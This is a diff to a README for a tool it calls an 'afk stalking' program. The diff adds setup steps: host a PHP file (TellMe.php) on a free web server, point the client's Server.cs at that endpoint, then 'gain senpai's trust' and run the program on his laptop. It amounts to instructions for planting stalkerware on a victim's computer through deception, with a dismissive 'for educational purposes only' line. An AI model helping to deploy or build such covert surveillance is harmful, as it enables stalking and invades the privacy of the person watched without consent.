@@ -27,4 +27,9 @@ An all-around tool for afk stalking ❤️ built primarily on minimal code, port
 
 and many more, I just don't feel like writing it all here. Explore the source code for yourself and see.
 
+## Setup...
+1. First you need a server, you may use any free webhosting service as long as it has PHP, upload [TellMe.php](Server/TellMe.php) there.
+1. Change the API endpoint at [Server.cs](Client/Communication/Server.cs) to your endpoint.
+1. Now all you need is to gain senpai's trust and run the program on his laptop.
+<br/>
 For educational purposes only 🤷‍♀️
